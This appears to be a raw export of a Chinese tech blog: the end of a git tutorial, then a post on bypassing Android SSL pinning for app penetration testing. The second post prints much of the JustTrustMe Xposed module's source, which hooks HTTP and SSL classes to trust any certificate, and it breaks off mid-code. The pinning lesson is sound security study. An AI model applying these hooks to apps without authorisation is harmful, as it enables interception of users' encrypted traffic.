<p>是这样的，比如我们修改了一个已经存在 在 git版本控制的文件比如readme.txt 但此时我们还未提交，如果此时我们切换到master，那么修改内容也会在master分支的reandme出现，而如果我们git stash 暂存当前的工作区，那么我们就会回到上一次commit的点上，再切换到master后，我们的工作区的内容不会对master分支的工作去造成任何影响。我们就可以更方便的进行master的操作。结束后 我们回到自己的分只进行 git stash pop 恢复 所有的git版本控制中的修改就都会还原，至于那些不在git版本控制中的文件，他永远都在工作区，既存在于master分支也存在与我们自己的开发分支，只有有人把他git add 进行提交时，它才归入版本控制库，独属于某一分支。</p>
<p>所以git stash在修复bug、切换分支时还是很有必要的。</p>
<p>然后我们切换到master分支去修bug</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"><span class="variable">$git</span> checkout -b issue-01 <span class="comment">#创建bug分支</span></span><br><span class="line"><span class="comment">#修复完成后add commit 并切换master分支合并</span></span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;merge bug fix 01&quot;</span></span><br><span class="line"><span class="variable">$git</span> checkout -d issue-01 <span class="comment">#合并后删除bug分支</span></span><br><span class="line"><span class="comment">#切换回工作区</span></span><br><span class="line"><span class="variable">$git</span> checkout test_bob</span><br><span class="line"><span class="variable">$git</span> stash list <span class="comment">#查看工作现场</span></span><br><span class="line"><span class="variable">$git</span> stash pop  <span class="comment">#恢复工作并删除存储的工作现场列表</span></span><br></pre></td></tr></table></figure>
<p>这样我们就完成了一次bug修复。</p>
<h5 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h5><p>某天客户心血来潮，说要加一个可以自动识别是人在玩儿手机还是狗在玩儿手机的功能。虽然你觉得很不靠谱且功能都开发的差不多了，但是客户就是上帝，你还是需要增加一个需求。</p>
<p>为了不让新功能把我们已经开发好的代码打乱，我们从当前的dev分支新建一个feature分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout -b feature-person-or-dog</span><br><span class="line"><span class="variable">$git</span> add person-or-dog.py</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;开发完毕，最后一个功能提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提交完切回dev分支进行代码合并</span></span><br><span class="line"><span class="variable">$git</span> checkout dev</span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;合并新功能&quot;</span> feature-person-or-dog</span><br><span class="line"><span class="variable">$git</span> branch -d feature-person-or-dog</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果在上一步提交之前这时候突然有一个插曲，客户又不要这个功能了，觉得这个功能太扯，我们就应该删除这个分支，防止别人知道我们开发了这么瞎扯的一个功能。</span></span><br><span class="line">$ git branch -d feature-person-or-dog</span><br><span class="line">error: The branch <span class="string">&#x27;person-or-dog&#x27;</span> is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run <span class="string">&#x27;git branch -D person-or-dog&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">#上面的错误就是如果一个分支未被合并是不能被删除的，只能强制删除，所以我们需要-D参数进行删除</span></span><br><span class="line"></span><br><span class="line">$ git branch -D feature-person-or-dog</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h5><p>当你从远程仓库克隆时，实际上git自动把本地的master分支和远程的master分支对应起来了，并且远程仓库默认名称就是origin。</p>
<p>要查看远程仓库的信息：<code> $git remote</code> 或者使用 ·<code>$git remote -v</code>查看更详细信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (fetch)</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (push)</span><br></pre></td></tr></table></figure>
<p>上面显示了可以抓取和推送的origin地址。如果没有推送权限，就看不到push的地址。</p>
<p>我们有时候建立了自己的分支，而这个分支远程库没有，这时候我们就需要自己推送分支到远程仓库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> push origin dev</span><br></pre></td></tr></table></figure>
<p>什么分支是适合推送的呢：</p>
<ul>
<li><p>master分支是主分支，因此要时刻与远程同步；</p>
</li>
<li><p>dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</p>
</li>
<li><p>bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</p>
</li>
<li><p>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</p>
</li>
</ul>
<p>新加入的小伙伴怎么开发：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">clone</span>  git@github.com:geeeez/git_test.git</span><br><span class="line"><span class="comment">#克隆完成后 git branch只能看到master分支，那小伙伴也想在dev分支开发。</span></span><br><span class="line"><span class="comment">#只需要创建一个本地dev分支，</span></span><br><span class="line"></span><br><span class="line">$ git checkout -b dev origin/dev</span><br><span class="line"><span class="comment">#然后在dev上继续修改，时不时的把devpush到远程</span></span><br><span class="line"><span class="comment">#注意此时的创建分支命令和前面的略有不同，这里的创建还有关联的意思。</span></span><br></pre></td></tr></table></figure>
<p>你的小伙盘推送完他的提交到origin&#x2F;dev 碰巧你也要改该分支同样的文件并试图推送。这时候就会推送失败，git会提示你先git pull 最新的 origin&#x2F;dev，然后本地合并解决冲突后再推送。</p>
<p>当然如果你此时的dev与远程的dev还没有关联起来，git pull会报错，那你首先应该关联再pull</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> branch --set-upstream-to=origin/dev dev</span><br><span class="line"><span class="variable">$git</span> pull  </span><br><span class="line"><span class="comment">#记住无法pull记得看是否把本地的test_bob对应到了远程的test_bob</span></span><br><span class="line"><span class="comment">#git pull 实际就是为了远程版本和本地版本合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#中间要修改冲突 add commit 然后-》</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> push origin dev</span><br></pre></td></tr></table></figure>

<p>因此，多人协作的工作模式通常是这样：</p>
<ul>
<li><p>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</p>
</li>
<li><p>如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并；</p>
</li>
<li><p>如果合并有冲突，则解决冲突，并在本地提交；</p>
</li>
<li><p>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</p>
</li>
<li><p>如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。</p>
</li>
<li><p>这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p>
</li>
</ul>
<p><strong>总结</strong>：</p>
<ul>
<li><p>查看远程库信息，使用<code> git remote -v</code>；</p>
</li>
<li><p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
</li>
<li><p>从本地推送分支，使用<code>git push origin branch-name</code>，如果推送失败，先用git pull抓取远程的新提交；</p>
</li>
<li><p>在本地创建和远程分支对应的分支，使用<code>git checkout -b branch-name origin/branch-name</code>，本地和远程分支的名称最好一致；</p>
</li>
<li><p>建立本地分支和远程分支的关联，使用<code>git branch --set-upstream branch-name origin/branch-name</code>；</p>
</li>
<li><p>从远程抓取分支，使用<code>git pull</code>，如果有冲突，要先处理冲突。</p>
</li>
</ul>
<h5 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h5><p>git中打标签非常简单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> branch</span><br><span class="line">*test-bob</span><br><span class="line"> master</span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"></span><br><span class="line"><span class="comment">#打标签</span></span><br><span class="line"><span class="variable">$git</span> tag v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有标签</span></span><br><span class="line"><span class="variable">$git</span> tag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>默认标签打在最新提交的commit上，有时候你想往上次的提交中打上一个标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看看提交的commit id</span></span><br><span class="line">git <span class="built_in">log</span> --pretty=online --abbrev-commit</span><br><span class="line">ffa9285 (HEAD -&gt; test_bob, tag: hahha2019-12-19, origin/test_bob) 2 modigy fix conflict</span><br><span class="line">e4c1719 2 2 modify</span><br><span class="line">2d8eeb3 sadsa</span><br><span class="line">bfdb7dd d</span><br><span class="line">7f599e8 fix conflict</span><br><span class="line">18e491f lear2 bob modify 03.txt</span><br><span class="line">0922ddd (origin/master, origin/HEAD, master) fix coment</span><br><span class="line">a515f05 master add 02-03</span><br><span class="line">483f6a0 add test_02</span><br><span class="line">ab77e12 add test_01</span><br><span class="line">8661a49 <span class="built_in">rm</span></span><br><span class="line">b8d2486 a git markdown</span><br><span class="line">bf14c12 learn2</span><br><span class="line">e22eedb add a a on line</span><br><span class="line">5da025d modify git to gid</span><br><span class="line">eb4c31e add a readme.md</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加标签到 bfdb7dd</span></span><br><span class="line"><span class="variable">$git</span> tag testbfdb7dd bfdb7dd</span><br><span class="line"></span><br><span class="line"><span class="comment">#而且还可以创建带有说明的标签 -a 指定标签名 -m 指定说明文字</span></span><br><span class="line"><span class="variable">$git</span> tag -a v0.1 -m <span class="string">&quot;version 0.1 released&quot;</span> eb4c31e</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用git show可以查看tag的说明文字</span></span><br><span class="line"><span class="variable">$git</span> show v0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#注意：标签总是和某个commit挂钩。如果这个commit既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。</span></span><br></pre></td></tr></table></figure>

<p>如果标签打错了也可以删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> tag -d v0.1</span><br></pre></td></tr></table></figure>
<p>因为标签只存储在本地，不会推送到远程。所以，打错的标签可以在本地安全删除。<br>如果需要推送某个标签到远程，可以使用命令：<code>bash git push origin &lt;tagname&gt;</code><br>或者，一次性推送全部未推送的标签：<code>bash $ git push origin --tags</code></p>
<p>如果推送到远程再想删除就稍微有点麻烦了:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先从本地删除</span></span><br><span class="line"><span class="variable">$git</span> tag -d v0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#再从远程删除 命令也是push</span></span><br><span class="line"><span class="variable">$git</span> push origin :refs/tags/v0.1</span><br></pre></td></tr></table></figure>

<h5 id="拯救强迫症"><a href="#拯救强迫症" class="headerlink" title="拯救强迫症"></a>拯救强迫症</h5><p>密码配置文件肯定不能上github但是每次提交时都会提醒你有一个文件未提交，这样强迫症患者很有压力，所以git解决了这个，你只需要创建一个.gitignore文件，然后编辑它，格式官方已经给出：<br><a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a><br>比如，在windows:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># windows</span></span><br><span class="line"><span class="number">777</span>.txt</span><br></pre></td></tr></table></figure>
<p>然后把.gitignore文件提交给版本库即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> add .gitignore</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;add .gitignore&quot;</span></span><br><span class="line"><span class="comment">#提交好后再次gitstatus 会发现777.txt直接就被忽略了</span></span><br><span class="line"><span class="variable">$git</span> status</span><br></pre></td></tr></table></figure>

<p>有时候我们已经提交了一个文件，但是我们希望以后不要再追踪这个文件了，我们就可以：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">rm</span> --catch 文件名</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后编辑.gitignore 添加进去文件名 并提交到版本库 从此以后文件的修改就不会被git status提示了</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>如何绕过app的ssl-pinning</title>
    <url>//posts/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87app%E7%9A%84ssl-pinning/</url>
    <content><![CDATA[<h3 id="什么是ssl-pinning？"><a href="#什么是ssl-pinning？" class="headerlink" title="什么是ssl-pinning？"></a>什么是ssl-pinning？</h3><p style="text-indent: 2em;">为了防止中间人攻击，app很多采用了证书固定技术，就是证书的双向认证。  
我们在burp抓取浏览器https的包时，有时候会弹出警告当前证书不可信，然后我们手动勾选信任即可进行抓包（这种就是单向验证，我们强制服务端接收我们自己的证书）。
</p>
<p style="text-indent: 2em;">app的双向验证就是，如果我们的证书和app内置在客户端的证书不一致，那么他就直接报错或者直接退出。所以我们在渗透测试app的业务时需要一点手段绕过ssl的双向认证，目前绕过ssl-pinning的主要手段就是hook和逆向源码重新修改修改 IPA 文件、打包、安装。
</p>
<p style="text-indent: 2em;">由于很多app都进行了加固，逆向源码是不太容易的事情，所以更多的人采用hook函数的方法来进行ssl-pinning的绕过，本篇文章就是介绍两种过SSL-unpining的绕过方法。
</p>
<span id="more"></span>


<h3 id="ssl-pinning实现方法"><a href="#ssl-pinning实现方法" class="headerlink" title="ssl-pinning实现方法"></a>ssl-pinning实现方法</h3><p style="text-indent: 2em;">长话短说，只有知道实现方法才能更好的理解hook原理，绝大多数都采用的是Okhttp这个库。
在OKhttp中实现 SSL Pining十分简单。

<p>先来看看官方文档，是英文的，但是为了阅读友好，我大概翻译了一下😂：</p>
<blockquote>
<p>默认情况下，okhttp信任主机平台的证书颁发机构。此策略最大化了连接，但它会受到证书颁发机构攻击，如2011 DigiNotar攻击。它还假设您的https服务器的证书是由证书颁发机构签名的。<br>使用CertificatePinner限制信任哪些证书和证书颁发机构。证书固定增加了安全性，但限制了服务器团队更新其TLS证书的能力。未经服务器的tls管理员许可，请勿使用证书固定。</p>
</blockquote>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CertificatePinning</span><span class="params">()</span> &#123;</span><br><span class="line">  client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">      .certificatePinner(<span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">          .add(<span class="string">&quot;publicobject.com&quot;</span>, <span class="string">&quot;sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=&quot;</span>)</span><br><span class="line">          .build())</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">      .url(<span class="string">&quot;https://publicobject.com/robots.txt&quot;</span>)</span><br><span class="line">      .build();</span><br><span class="line"></span><br><span class="line">  <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">  <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Certificate certificate : response.handshake().peerCertificates()) &#123;</span><br><span class="line">    System.out.println(CertificatePinner.pin(certificate));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外还有更简单的，直接在AndroidManifest.xml 中指定(好像有版本限制，但是版本我忘了😂)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;network-security-config&gt;</span><br><span class="line">    &lt;domain-config&gt;</span><br><span class="line">        &lt;domain includeSubdomains=&quot;true&quot;&gt;appmattus.com&lt;/domain&gt;</span><br><span class="line">        &lt;pin-set&gt;</span><br><span class="line">            &lt;pin digest=&quot;SHA-256&quot;&gt;4hw5tz+scE+TW+mlai5YipDfFWn1dqvfLG+nU7tq1V8=&lt;/pin&gt;</span><br><span class="line">            &lt;pin digest=&quot;SHA-256&quot;&gt;YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=&lt;/pin&gt;</span><br><span class="line">        &lt;/pin-set&gt;</span><br><span class="line">    &lt;/domain-config&gt;</span><br><span class="line">&lt;/network-security-config&gt;</span><br></pre></td></tr></table></figure>
<p>先来了解下https的工作流程：</p>
<blockquote>
<p>在会话的初始阶段，客户端第一次发送请求时，通过明文进行发送的，为了防止信息泄露，服务端在返回时则返回一个公钥和证书给客户端。客户端验证证书是否是认证机构颁发，证书是否在有效期内，若没问题则进行下一次请求。在下一次客户端发送请求的时，通过公钥对核心数据进行加密，服务端在接收到数据时，获取对称加密的密钥。此后请求就是通过对称加密的密钥进行加密。</p>
</blockquote>
<p>那我们来捋一遍流程，安装app时app的自带证书就安置到了我们的手机，且此证书也存在在服务端，另外app的代码是开启了SSLpinning的，当我们用burp抓包时需要导入手机证书，那我们劫持https的流量就是用我们burp的证书加解密的，而burp的证书和app的自带证书不一致，所以直接down。多说一句，证书的一致性是通过sha&#x2F;256来进行比较的。</p>
<h3 id="xpose绕过ssl-pining"><a href="#xpose绕过ssl-pining" class="headerlink" title="xpose绕过ssl-pining"></a>xpose绕过ssl-pining</h3><p>xpose下载地址：<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a><br>注意：目前好像不支持android 9.0以上，我也不会写怎么安装的。恩，懒得写。</p>
<p><strong>JustTrustMe模块绕过：</strong><br>模块下载地址 <a href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe</a><br>此模块是以前用的最多的模块，但是近来越来越不好用了，经过源码分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> just.trust.me;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.net.http.SslError;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.webkit.SslErrorHandler;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStore;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyStoreException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.X509Certificate;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyManagementException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.HostnameVerifier;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.KeyManager;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLContext;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.TrustManager;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.X509TrustManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.ClientConnectionManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.HostNameResolver;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.PlainSocketFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.SchemeRegistry;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.scheme.Scheme;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.DefaultHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.conn.SingleClientConnManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.params.HttpParams;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.callMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.callStaticMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookConstructor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.getObjectField;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.newInstance;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.setObjectField;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;JustTrustMe&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">currentPackageName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        currentPackageName = lpparam.packageName;</span><br><span class="line">        <span class="comment">/* Apache Hooks */</span></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getSCCM());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient(HttpParams params) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient(HttpParams) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, HttpParams.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, (HttpParams) param.args[<span class="number">0</span>]);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getSCCM());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient(ClientConnectionManager conman, HttpParams params) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient(ClientConnectionManager, HttpParams) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, ClientConnectionManager.class, HttpParams.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">HttpParams</span> <span class="variable">params</span> <span class="operator">=</span> (HttpParams) param.args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, params);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getCCM(param.args[<span class="number">0</span>], params));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public SSLSocketFactory( ... ) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking SSLSocketFactory(String, KeyStore, String, KeyStore) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(SSLSocketFactory.class, String.class, KeyStore.class, String.class, KeyStore.class,</span><br><span class="line">                SecureRandom.class, HostNameResolver.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="type">String</span> <span class="variable">algorithm</span> <span class="operator">=</span> (String) param.args[<span class="number">0</span>];</span><br><span class="line">                        <span class="type">KeyStore</span> <span class="variable">keystore</span> <span class="operator">=</span> (KeyStore) param.args[<span class="number">1</span>];</span><br><span class="line">                        <span class="type">String</span> <span class="variable">keystorePassword</span> <span class="operator">=</span> (String) param.args[<span class="number">2</span>];</span><br><span class="line">                        <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> (SecureRandom) param.args[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">                        KeyManager[] keymanagers = <span class="literal">null</span>;</span><br><span class="line">                        TrustManager[] trustmanagers = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (keystore != <span class="literal">null</span>) &#123;</span><br><span class="line">                            keymanagers = (KeyManager[]) callStaticMethod(SSLSocketFactory.class, <span class="string">&quot;createKeyManagers&quot;</span>, keystore, keystorePassword);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        trustmanagers = <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ImSureItsLegitTrustManager</span>()&#125;;</span><br><span class="line"></span><br><span class="line">                        setObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>, SSLContext.getInstance(algorithm));</span><br><span class="line">                        callMethod(getObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>), <span class="string">&quot;init&quot;</span>, keymanagers, trustmanagers, random);</span><br><span class="line">                        setObjectField(param.thisObject, <span class="string">&quot;socketfactory&quot;</span>,</span><br><span class="line">                                callMethod(getObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>), <span class="string">&quot;getSocketFactory&quot;</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public static SSLSocketFactory getSocketFactory() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking static SSLSocketFactory(String, KeyStore, String, KeyStore) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span 